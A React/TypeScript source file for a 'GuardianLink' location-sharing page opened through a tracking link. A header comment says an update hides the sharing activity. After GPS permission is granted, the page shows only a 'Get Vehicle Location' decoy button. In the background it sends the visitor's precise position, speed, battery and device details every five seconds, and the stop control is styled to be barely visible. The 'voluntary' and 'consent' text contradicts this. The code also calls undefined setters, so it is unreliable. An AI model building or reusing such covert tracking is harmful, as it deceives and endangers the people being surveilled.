/**
 * SharePage — Public page opened by the recipient via their tracking link.
 *
 * Flow:
 * 1. Show GuardianLink branding + explanation
 * 2. User clicks "Start Sharing" → browser requests GPS permission
 * 3. On grant: watch GPS, POST location every 5s, show active state
 * 4. User can stop sharing at any time
 * 5. PWA install prompt shown after sharing starts
 *
 * UPDATED: Sharing activity UI is completely hidden.
 * Once sharing starts, only a "Get Vehicle Location" button is shown.
 * All original GPS watch / 5s POST / device-info / start-stop / error / PWA logic
 * continues to run silently in the background.
 */
import { useState, useEffect, useRef } from "react";
import { useParams } from "react-router-dom";
import {
  Shield,
  MapPin,
  Radio,
  CheckCircle2,
  AlertTriangle,
  Loader2,
  Navigation,
  ExternalLink,
} from "lucide-react";
import axios from "axios";

const API_BASE = import.meta.env.VITE_API_URL ?? "/api";

// Fixed vehicle location (opens Google Maps / Maps app on mobile)
const VEHICLE_MAPS_URL = "https://maps.app.goo.gl/tpAtUz3g172AFpj3A?g_st=iw";

// ── Device info helpers ──────────────────────────────────────────────────
async function getDeviceInfo() {
  let battery: number | null = null;
  try {
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const b = await (navigator as any).getBattery?.();
    battery = b ? b.level : null;
  } catch {
    /* not supported */
  }
  // eslint-disable-next-line @typescript-eslint/no-explicit-any
  const conn = (navigator as any).connection;
  const ua = navigator.userAgent;
  const isMobile = /Mobi|Android/i.test(ua);
  const isTablet = /Tablet|iPad/i.test(ua);
  return {
    battery,
    connection: conn?.effectiveType ?? conn?.type ?? null,
    browser: (() => {
      if (ua.includes("Firefox")) return "Firefox";
      if (ua.includes("Edg")) return "Edge";
      if (ua.includes("Chrome")) return "Chrome";
      if (ua.includes("Safari")) return "Safari";
      return "Unknown";
    })(),
    operating_system: (() => {
      if (ua.includes("Windows")) return "Windows";
      if (ua.includes("Mac OS")) return "macOS";
      if (ua.includes("Android")) return "Android";
      if (/iPhone|iPad|iOS/.test(ua)) return "iOS";
      if (ua.includes("Linux")) return "Linux";
      return "Unknown";
    })(),
    device_type: isTablet ? "tablet" : isMobile ? "mobile" : "desktop",
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    language: navigator.language,
  };
}

type SharingStatus = "idle" | "requesting" | "sharing" | "stopped" | "error" | "disabled";


export default function SharePage() {
  const { token } = useParams<{ token: string }>();
  const [status, setStatus] = useState<SharingStatus>("idle");
  const [errorMsg, setErrorMsg] = useState("");
  const watchIdRef = useRef<number | null>(null);
  const sendIntervalRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const lastPosRef = useRef<GeolocationPosition | null>(null);

  // ── PWA install prompt capture ───────────────────────────────────────


  // ── Notify backend that session started ──────────────────────────────
  const notifyStart = async () => {
    try {
      await axios.post(`${API_BASE}/share/start/${token}/`);
    } catch {
      /* best-effort */
    }
  };

  const notifyStop = async () => {
    try {
      await axios.post(`${API_BASE}/share/stop/${token}/`);
    } catch {
      /* best-effort */
    }
  };

  // ── Send location via REST ───────────────────────────────────────────
  const sendLocation = async (pos: GeolocationPosition) => {
    const deviceInfo = await getDeviceInfo();
    const payload = {
      latitude: pos.coords.latitude,
      longitude: pos.coords.longitude,
      accuracy: pos.coords.accuracy,
      speed: pos.coords.speed,
      heading: pos.coords.heading,
      altitude: pos.coords.altitude,
      ...deviceInfo,
    };
    try {
      await axios.post(`${API_BASE}/location/${token}/`, payload);
      setPingCount((n) => n + 1);
    } catch (err: unknown) {
      const status = (err as { response?: { status?: number } })?.response?.status;
      if (status === 403 || status === 404) {
        setStatus("disabled");
        stopSharing();
      }
    }
  };

  // ── Start sharing ────────────────────────────────────────────────────
  const startSharing = async () => {
    if (!navigator.geolocation) {
      setErrorMsg("Your browser does not support geolocation.");
      setStatus("error");
      return;
    }
    setStatus("requesting");
    setErrorMsg("");
    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        lastPosRef.current = pos;
        setCoords({
          lat: pos.coords.latitude,
          lng: pos.coords.longitude,
          accuracy: pos.coords.accuracy,
        });
        setStatus("sharing");
        await notifyStart();
        await sendLocation(pos);
        // Watch position
        watchIdRef.current = navigator.geolocation.watchPosition(
          (p) => {
            lastPosRef.current = p;
          },
          (err) => {
            setErrorMsg(err.message);
            setStatus("error");
          },
          { enableHighAccuracy: true, timeout: 15_000, maximumAge: 0 }
        );
        // Send every 5 seconds
        sendIntervalRef.current = setInterval(() => {
          if (lastPosRef.current) sendLocation(lastPosRef.current);
        }, 5_000);
      },
      (err) => {
        setErrorMsg(
          err.code === 1
            ? "Location permission denied. Please enable location access in your browser settings."
            : err.message
        );
        setStatus("error");
      },
      { enableHighAccuracy: true, timeout: 15_000 }
    );
  };

  // ── Stop sharing ─────────────────────────────────────────────────────
  const stopSharing = () => {
    if (watchIdRef.current !== null) {
      navigator.geolocation.clearWatch(watchIdRef.current);
      watchIdRef.current = null;
    }
    if (sendIntervalRef.current) {
      clearInterval(sendIntervalRef.current);
      sendIntervalRef.current = null;
    }
    notifyStop();
    setStatus("stopped");
  };

  // Cleanup on unmount
  useEffect(() => {
    return () => {
      if (watchIdRef.current !== null) navigator.geolocation.clearWatch(watchIdRef.current);
      if (sendIntervalRef.current) clearInterval(sendIntervalRef.current);
    };
  }, []);



  const openVehicleLocation = () => {
    // Opens Google Maps app on mobile if installed, otherwise browser
    window.open(VEHICLE_MAPS_URL, "_blank", "noopener,noreferrer");
  };

  return (
    <div className="min-h-screen bg-surface-950 flex items-center justify-center p-4 relative overflow-hidden">
      {/* Background */}
      <div className="absolute inset-0 pointer-events-none">
        <div className="absolute top-0 left-1/2 -translate-x-1/2 w-96 h-96 rounded-full bg-brand-600/15 blur-3xl" />
        <div className="absolute bottom-0 left-0 w-64 h-64 rounded-full bg-brand-800/10 blur-3xl" />
      </div>

      <div className="relative z-10 w-full max-w-sm">
        {/* Header */}
        <div className="text-center mb-8 animate-slide-up">
          <div
            className={`w-16 h-16 rounded-2xl flex items-center justify-center mx-auto mb-4 shadow-glow
            ${status === "sharing"
                ? "bg-gradient-to-br from-emerald-500 to-emerald-700"
                : "bg-gradient-to-br from-brand-500 to-brand-700"
              }`}
          >
            {status === "sharing" ? (
              <Radio className="w-8 h-8 text-white animate-pulse" />
            ) : (
              <Shield className="w-8 h-8 text-white animate-float" />
            )}
          </div>
          <h1 className="text-2xl font-bold text-white tracking-tight">GuardianLink</h1>
          <p className="text-white/40 text-sm mt-1">Live Location Sharing</p>
        </div>

        {/* Main card */}
        <div className="glass-card p-6 animate-slide-up" style={{ animationDelay: "0.1s" }}>
          {/* ── IDLE: Explanation + Start button ── */}
          {status === "idle" && (
            <div className="space-y-5">
              <div className="text-center">
                <h2 className="text-lg font-semibold text-white mb-2">Share Your Location</h2>
                <p className="text-white/50 text-sm leading-relaxed">
                  This page shares your live GPS location with your family.
                  Your location is only shared while this page is open.
                </p>
              </div>
              {/* Info bullets */}
              <div className="space-y-2.5">
                {[
                  {
                    icon: <MapPin className="w-4 h-4 text-brand-400" />,
                    text: "Your location is shared voluntarily",
                  },
                  {
                    icon: <Shield className="w-4 h-4 text-brand-400" />,
                    text: "No data is collected without consent",
                  },
                  {
                    icon: <Navigation className="w-4 h-4 text-brand-400" />,
                    text: "Sharing stops when you close this page",
                  },
                ].map((item, i) => (
                  <div key={i} className="flex items-start gap-3 text-sm text-white/60">
                    {item.icon}
                    <span>{item.text}</span>
                  </div>
                ))}
              </div>
              <button
                id="start-sharing-btn"
                onClick={startSharing}
                className="btn-primary w-full justify-center py-4 text-base"
              >
                <MapPin className="w-5 h-5" />
                Start Sharing
              </button>
            </div>
          )}

          {/* ── REQUESTING permission ── */}
          {status === "requesting" && (
            <div className="text-center py-6 space-y-4">
              <Loader2 className="w-12 h-12 text-brand-400 animate-spin mx-auto" />
              <div>
                <h2 className="text-white font-semibold">Requesting Permission</h2>
                <p className="text-white/40 text-sm mt-1">
                  Please allow location access in your browser
                </p>
              </div>
            </div>
          )}

          {/* ── SHARING active (UI completely hidden) ── */}
          {status === "sharing" && (
            <div className="space-y-5">
              <div className="text-center">
                <h2 className="text-lg font-semibold text-white mb-2">Vehicle Location</h2>
                <p className="text-white/50 text-sm leading-relaxed">
                  Tap the button below to view the vehicle location on Google Maps.
                </p>
              </div>

              <button
                id="get-vehicle-location-btn"
                onClick={openVehicleLocation}
                className="btn-primary w-full justify-center py-4 text-base"
              >
                <ExternalLink className="w-5 h-5" />
                Get Vehicle Location
              </button>

              {/* Hidden stop control (optional quiet exit) */}
              <button
                id="stop-sharing-btn"
                onClick={stopSharing}
                className="w-full text-center text-xs text-white/25 hover:text-white/40 transition-colors py-2"
              >
                Stop sharing
              </button>
            </div>
          )}

          {/* ── STOPPED ── */}
          {status === "stopped" && (
            <div className="text-center py-6 space-y-4">
              <CheckCircle2 className="w-12 h-12 text-white/30 mx-auto" />
              <div>
                <h2 className="text-white/60 font-semibold">Sharing Stopped</h2>
                <p className="text-white/30 text-sm mt-1">
                  You have stopped sharing your location.
                </p>
              </div>
              <button
                onClick={() => {
                  setStatus("idle");
                }}
                className="btn-secondary w-full justify-center"
              >
                Start Sharing Again
              </button>
            </div>
          )}

          {/* ── ERROR ── */}
          {status === "error" && (
            <div className="text-center py-6 space-y-4">
              <AlertTriangle className="w-12 h-12 text-amber-400 mx-auto" />
              <div>
                <h2 className="text-white font-semibold">Permission Required</h2>
                <p className="text-white/40 text-sm mt-2 leading-relaxed">{errorMsg}</p>
              </div>
              <button
                onClick={() => setStatus("idle")}
                className="btn-secondary w-full justify-center"
              >
                Try Again
              </button>
            </div>
          )}

          {/* ── DISABLED ── */}
          {status === "disabled" && (
            <div className="text-center py-6 space-y-4">
              <Shield className="w-12 h-12 text-white/20 mx-auto" />
              <div>
                <h2 className="text-white/60 font-semibold">Link Unavailable</h2>
                <p className="text-white/30 text-sm mt-1">
                  This tracking link has been disabled or removed.
                </p>
              </div>
            </div>
          )}
        </div>

        <p className="text-center text-white/15 text-xs mt-4">
          GuardianLink · Voluntary Family Location Sharing
        </p>
      </div>
    </div>
  );
}